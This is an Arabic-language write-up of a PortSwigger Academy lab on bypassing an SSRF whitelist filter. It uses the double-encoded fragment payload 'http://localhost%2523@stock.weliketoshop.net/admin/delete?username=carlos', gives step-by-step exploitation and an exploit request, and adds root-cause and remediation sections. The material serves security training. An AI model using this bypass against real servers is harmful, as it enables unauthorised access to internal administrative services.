# Lab 06 — SSRF with Whitelist-Based Input Filter (كسر القائمة البيضاء بالتناقض بين المحلل والاتصال)

[![التصنيف](https://img.shields.io/badge/الفئة-SSRF-red)]()
[![النوع](https://img.shields.io/badge/النوع-SSRF%20Whitelist%20Bypass%20(URL%20Parser%20Differential)-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-حرج%20(Critical)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/ssrf)

> هذا الشرح جزء من سلسلة [معامل تزوير الطلبات (SSRF)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 06 — SSRF with Whitelist-Based Input Filter (كسر القائمة البيضاء بالتناقض بين المحلل والاتصال) |
| **تصنيف الثغرة** | SSRF Whitelist Bypass (URL Parser Differential) |
| **معيار الضعف (CWE)** | CWE-918: Server-Side Request Forgery (SSRF) |
| **مستوى الخطورة** | حرج (Critical) |
| **الهدف من اللاب** | تجاوز قائمة بيضاء صارمة تشترط stock.weliketoshop.net للوصول لـ http://localhost/admin وحذف carlos. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

وضع المطور هنا قائمة بيضاء تفحص هل يحتوي اسم المضيف على `stock.weliketoshop.net`.

**الخلل الفكري العبقري في تفكيك الروابط (URL Specification):**
يدعم معيار الـ URL وضع بيانات الدخول قبل اسم المضيف بصيغة: `http://username@hostname`.
كما يدعم رمز الـ Fragment `#` للإشارة إلى علامة مرجعية داخل الصفحة، حيث يقوم متصفح ومكتبات الـ HTTP بتجاهل وحذف كل ما يأتي بعد `#` عند إجراء الاتصال الفعلي!
إذا أرسلنا البيلود التالي مع تشفير الـ `#` مرتين كـ `%2523`:
`http://localhost%2523@stock.weliketoshop.net/`
1. **محلل الفلتر:** يرى أن الرابط يحتوي على `@stock.weliketoshop.net` فيعتبره الدومين المسموح به ويمرره!
2. **مكتبة الاتصال:** تفك التشفير المزدوج إلى `#`، فتعتبر كل ما بعد `#` (بما فيه `@stock...`) مجرد Fragment داخلي وتقوم بإهماله، وتتصل حصراً بالمضيف الأول وهو: `http://localhost/`!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يستغل الاختلاف في تفسير رمزي `@` و `#` بين دالة التحقق ومكتبة الاتصال للاحتيال على القائمة البيضاء.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
الاعتماد على الفحص النصي اليدوي للرابط بدلاً من استخدام دوال التفكيك الموحدة والتحقق من المضيف الصافي.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. التقط طلب فحص المخزون `POST /product/stock` في Repeater.
2. جرب إرسال `http://127.0.0.1/` ستجد رسالة رفض لأن الرابط يجب أن يحتوي على الدومين المعتمد.
3. جرب إضافة اسم مستخدم مزيف بالرمز `@`:
`stockApi=http://localhost@stock.weliketoshop.net` (ستجد أن السيرفر قبله ولكنه حاول الاتصال بالدومين الخارجي).
4. الآن، أضف رمز الـ Fragment مشفراً مرتين (`%2523`) قبل `@` لفصل الدومين المعتمد وجعله مهملاً:
`stockApi=http://localhost%2523@stock.weliketoshop.net/admin`.
5. اضغط Send: ستجد أن السيرفر فتح صفحة الإدارة `200 OK`!
6. عدل الرابط النهائي لحذف المستخدم:
`stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`.

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /product/stock HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 302 Found
Location: /admin
...
```

---

## 6. الأثر الواقعي للثغرة (Impact)

انهيار كامل لحصانة القوائم البيضاء والوصول إلى كافة الخدمات الإدارية الداخلية.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

تفكيك الرابط باستخدام دوال رسمية معتمدة ومطابقة الـ `hostname` بدقة تامة دون فحص جزئي بالـ Regex.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP Top 10 — A10:2021 Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
